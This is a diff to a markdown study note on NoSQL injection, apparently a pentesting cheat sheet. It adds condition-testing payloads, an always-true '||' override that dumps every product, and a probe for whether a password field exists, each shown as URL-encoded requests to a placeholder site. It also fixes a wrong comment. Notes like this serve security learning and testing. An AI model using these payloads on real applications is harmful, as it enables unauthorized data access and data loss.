@@ -34,8 +34,12 @@
 
 ### **Confirming conditional behavior**
 
-* false condition: `' && 0 && 'x`
-* true condition: `' && 1 && 'x`&#x20;
+* false condition:&#x20;
+  * `' && 0 && 'x`
+  * `' && '1'=='2`
+* true condition:&#x20;
+  * `' && 1 && 'x`&#x20;
+  * `' && '1'=='1`
 
 ```
 https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
@@ -48,9 +52,11 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 ### **Overriding existing conditions**
 
-* Always true: `'||1||'`
+* Always true:&#x20;
+  * `'||1||'`
+  * `'||'1'=='1'`
 * `https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27`
-* `this.category == 'fizzy'||'1'=='1'`
+* `this.category == 'fizzy'||1||''`
 * The modified query returns all items (all the products in any category).
 * WARN: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
 
@@ -151,7 +157,7 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 * Send the payload for an existing field and for a field that doesn't exist.&#x20;
 * Example
   * `admin' && this.username!='` (you know `username` field exists)
-  * `admin' && this.foo!='` (you know `foo` field exists)
+  * `admin' && this.foo!='` (you know `foo` field doesn't exist)
   * `admin' && this.password!='` (you want identify `password` field)
     * `https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
 *   If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).
